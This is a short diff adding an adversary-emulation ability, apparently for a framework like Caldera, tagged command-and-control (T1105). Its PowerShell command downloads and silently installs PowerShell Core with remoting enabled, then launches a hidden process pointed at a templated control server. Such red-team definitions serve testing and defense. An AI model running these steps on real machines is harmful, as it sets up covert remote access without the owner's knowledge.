@@ -1,0 +1,21 @@
+---
+
+- id: 60f63260-39bb-4136-87a0-b6c2dca799fc
+  name: Install PowerShell Core 6
+  description: Download, install and start new process under PowerShell Core 6
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  platforms:
+    windows:
+      psh:
+        command: |
+          $wc=New-Object System.Net.WebClient;
+          $output="PowerShellCore.msi";
+          $wc.DownloadFile("https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi", $output);
+          Start-Process msiexec.exe -ArgumentList "/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1" -Wait;
+          $env:Path += ";C:\Program Files\Powershell\6";
+          Start-Process pwsh -ArgumentList "-c #{location} -server #{server} - group #{group}" -WindowStyle hidden;
+        cleanup: |
+          rm PowerShellCore.msi;
